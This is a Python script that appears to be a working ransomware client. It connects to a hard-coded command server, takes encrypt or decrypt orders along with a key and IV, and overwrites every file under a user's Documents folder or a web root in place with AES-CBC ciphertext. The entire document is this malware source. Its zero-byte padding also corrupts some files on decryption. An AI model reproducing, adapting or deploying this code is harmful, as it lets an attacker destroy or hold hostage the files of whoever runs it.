import socket
from Crypto.Cipher import AES
import os
import time


def socketing():
    port = 12345
    ip = "192.168.10.122"

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    error = True
    while error:
        try:
            s.connect((ip, port))
            error = False
        except:
            time.sleep(3)

    while True:
        type = s.recv(9999)

        if type == b'End':
            s.close()
            exit()

        key = s.recv(9999)
        IV = s.recv(9999)
        print("Received")

        main(key, IV, paths, type)
        s.send(b'Complete')

    #s.close()


def main(key, IV, paths, type):
    for path in paths:
        if os.path.exists(path):
            if type == b'Encrypt':
                AES_Encrypt_File(key, IV, path).main()

            elif type == b'Decrypt':
                AES_Decrypt_File(key, IV, path).main()


class AES_Encrypt_File:

    def __init__(self, key, IV, path):
        self.key = key
        self.IV = IV
        mode = AES.MODE_CBC
        self.cipher = AES.new(key, mode, IV)
        self.path = path

    def pad_data(self, data):
        while len(data) % 16 != 0:
            data += b'0'
        return data

    def encrypt_doc(self, path):
        try:
            file = open(path, "rb")
            data = file.read()
            file.close()

            final_data = self.pad_data(data)
            encrypted_msg = self.cipher.encrypt(final_data)

            file = open(path, "wb")
            file.write(encrypted_msg)
            file.close()

        except Exception as error:
            print(error)


    def directory_looper(self):
        path_d = []

        for directory in os.walk(self.path):
            path_d.append(directory)

        if len(path_d) == 0:
            # file_name = self.path.rsplit("/", 1)[-1]
            self.encrypt_doc(self.path)

        else:
            for loop1 in range(len(path_d)):
                path_r, direc, file = path_d[loop1]

                for all_files in file:
                    file_path = path_r + "/" + all_files

                    self.encrypt_doc(file_path)

        print("\nCompleted")

    def main(self):
        self.directory_looper()


class AES_Decrypt_File:

    def __init__(self, key, IV, path):
        self.key = key
        self.IV = IV
        mode = AES.MODE_CBC
        self.cipher = AES.new(key, mode, IV)
        self.path = path

    def decrypt_doc(self, path):
        try:
            file = open(path, "rb")
            data = file.read()
            file.close()

            decrypted_msg = self.cipher.decrypt(data)
            final_data = decrypted_msg.rstrip(b'0')

            file = open(path, "wb")
            file.write(final_data)
            file.close()

        except Exception as error:
            print(error)

    def directory_looper(self):
        path_d = []
        for directory in os.walk(self.path):
            path_d.append(directory)

        if len(path_d) == 0:
            self.decrypt_doc(self.path)

        else:
            for loop1 in range(len(path_d)):
                path_r, direc, file = path_d[loop1]

                for all_files in file:
                    file_path = path_r + "/" + all_files
                    self.decrypt_doc(file_path)

        print("\nCompleted")

    def main(self):
        self.directory_looper()



if os.name == "nt":
    paths = ["C:/Users/admin/Documents"]
else:
    paths = ["/opt/lampp/htdocs/project"]

socketing()